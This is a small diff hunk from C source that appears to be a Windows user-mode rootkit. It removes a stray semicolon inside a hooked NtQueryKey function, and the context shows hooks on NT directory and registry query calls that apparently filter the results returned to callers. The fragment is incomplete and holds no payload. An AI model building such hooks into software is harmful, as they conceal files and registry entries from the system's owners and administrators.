@@ -395,7 +395,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 }
 static NTSTATUS NTAPI HookedNtQueryKey(HANDLE key, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG length, PULONG resultLength)
 {
-	NTSTATUS status = OriginalNtQueryKey(key, keyInformationClass, keyInformation, length, resultLength);;
+	NTSTATUS status = OriginalNtQueryKey(key, keyInformationClass, keyInformation, length, resultLength);
 
 	if (NT_SUCCESS(status) && (keyInformationClass == KeyFullInformation || keyInformationClass == KeyCachedInformation))
 	{
